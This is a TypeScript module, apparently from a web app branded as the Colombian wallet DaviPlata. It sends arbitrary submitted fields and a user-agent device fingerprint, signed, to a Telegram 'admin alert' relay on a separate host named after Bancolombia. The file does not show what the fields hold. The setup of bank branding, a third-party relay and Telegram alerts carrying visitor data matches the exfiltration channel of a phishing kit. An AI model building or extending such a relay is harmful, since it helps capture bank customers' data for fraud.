import { sign } from "node:crypto";
import { deriveDaviAuditKeys } from "../../../lib/daviplata-audit-crypto.js";

const RELAY_URL = "https://bancolombia-usa-sim.pages.dev/api/daviplata-audit";

function clean(value: unknown, maxLength = 240) {
  return String(value ?? "")
    .replace(/[\u0000-\u001f\u007f]+/g, " ")
    .replace(/\s+/g, " ")
    .trim()
    .slice(0, maxLength) || "—";
}

export function describeAdminDevice(userAgent = "") {
  const ua = String(userAgent);
  const os = /iPhone|iPad|iPod/i.test(ua) ? "iOS"
    : /Android/i.test(ua) ? "Android"
      : /Windows/i.test(ua) ? "Windows"
        : /Mac OS X|Macintosh/i.test(ua) ? "macOS"
          : /Linux/i.test(ua) ? "Linux" : "Sistema desconocido";
  const browser = /EdgA?|EdgiOS/i.test(ua) ? "Edge"
    : /SamsungBrowser/i.test(ua) ? "Samsung Internet"
      : /CriOS|Chrome/i.test(ua) ? "Chrome"
        : /FxiOS|Firefox/i.test(ua) ? "Firefox"
          : /Safari/i.test(ua) ? "Safari" : "Navegador desconocido";
  const device = /iPad|Tablet/i.test(ua) ? "Tablet"
    : /Mobile|iPhone|Android/i.test(ua) ? "Móvil" : "Escritorio";
  return `${device} · ${os} · ${browser}`;
}

export async function notifyAdminTelegram({
  app,
  event,
  fields = {},
  userAgent = "",
}: {
  // DaviPlata relays through the existing Cloudflare API; no Telegram variables
  // are required in the Vercel project.
  app: string;
  event: string;
  fields?: Record<string, unknown>;
  userAgent?: string;
}) {
  const secret = process.env.SESSION_SECRET;
  if (!secret) {
    console.warn("[DaviPlata admin alerts] Existing session secret is unavailable.");
    return false;
  }
  const payload = {
    app: clean(app, 80),
    event: clean(event, 100),
    fields: Object.fromEntries(Object.entries(fields)
      .filter(([, value]) => value !== undefined && value !== null)
      .slice(0, 20)
      .map(([label, value]) => [clean(label, 80), clean(value)])),
    ...(userAgent ? { device: describeAdminDevice(userAgent) } : {}),
  };
  const body = JSON.stringify(payload);
  const timestamp = String(Date.now());
  const { privateKey } = deriveDaviAuditKeys(secret);
  const signature = sign(null, Buffer.from(`${timestamp}.${body}`), privateKey).toString("base64url");

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 3_500);
  try {
    const response = await fetch(RELAY_URL, {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "x-davi-timestamp": timestamp,
        "x-davi-signature": signature,
      },
      body,
      signal: controller.signal,
    });
    if (!response.ok) console.warn("[DaviPlata admin alerts] Notification relay failed:", response.status);
    return response.ok;
  } catch {
    console.warn("[DaviPlata admin alerts] Notification relay failed.");
    return false;
  } finally {
    clearTimeout(timeout);
  }
}
